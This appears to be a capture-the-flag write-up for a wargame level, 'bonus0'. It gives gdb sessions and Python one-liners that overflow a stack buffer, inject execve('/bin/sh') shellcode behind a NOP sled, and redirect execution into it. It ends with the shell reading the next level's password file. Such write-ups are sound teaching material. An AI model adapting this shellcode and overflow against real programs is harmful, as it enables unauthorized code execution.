@@ -1,0 +1,55 @@
+Buffer Overflow
+
+The binary take 2 input from standard input and write them both together
+The main will create a buffer of 50 pass it to pp function
+pp have 2 local string of 20 it will call p 2 time to store string
+p have a buffer of 4096 long we can exploit doing an overflow during the second input
+
+We put a string longer than 20 so the \0 is further and the 2nd string will be were we set the jump
+Returning to pp it will cat the 2 string with a space
+The main will retrieve the string cat, which is 60 long allowing us to place
+our jump into the EBP address and starting the shellcode
+
+(gdb) set disassembly-flavor intel
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+
+(gdb) r < <(python -c 'print "A"*20 + "\n" + "B"*4084 + "CCCCDDDDEEEE"')
+
+gdb trys to jump at address "43434343" which is "CCCC", therefor we know where
+to put the address we want to jump to.
+
+Putting a shellcode on the second input will allow us to jump into it, we need
+to find the address of the start of our shellcode.
+
+(gdb) disass p
+(gdb) b *0x080484f4   (At <+64> after lea eax,[ebp-0x1008] will have begining of buffer printing $eax)
+(gdb) r < <(python -c 'print "A"*20 + "\n" + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "B"*4046 + "CCCCDDDDEEEE"')
+
+(gdb) x/64x $eax
+
+Begining of buffer is 0xbfffe6b0 and begining of our shellcode is at 0xbfffe6c5.
+So we replace "CCCCDDDDEEEE" by "\xc5\xe6\xff\xbf"*3
+
+(gdb) r < <(python -c 'print "A"*20 + "\n" + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "B"*4046 + "\xc5\xe6\xff\xbf"*3')
+
+We get a segfault but why?
+
+Putting a breakpoint after strncpy in p and printing the buffer we notice that
+it was modified \x00 was inserted at 0xbfffe6c5.
+
+(gdb) b *0x0804851c
+(gdb) r < <(python -c 'print "A"*20 + "\n" + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "B"*4046 + "\xc5\xe6\xff\xbf"*3')
+
+To bypass this problem we'll put some junk before our shellcode and jump a little bit further,
+putting "\x90"*8 the new address of the start of our shellcode is 0xbfffe6cd.
+
+(gdb) r < <(python -c 'print "A"*20 + "\n" + "\x90"*8 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "B"*4038 + "\xcd\xe6\xff\xbf"*3')
+
+Executing new program /bin/dash !!!!
+
+(python -c 'print "A"*20 + "\n" + "\x90"*8 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "B"*4038 + "\xcd\xe6\xff\xbf"*3') > /tmp/pload && cat /tmp/pload - | ./bonus0
+
+whoami
+cd ../bonus1
+cat .pass
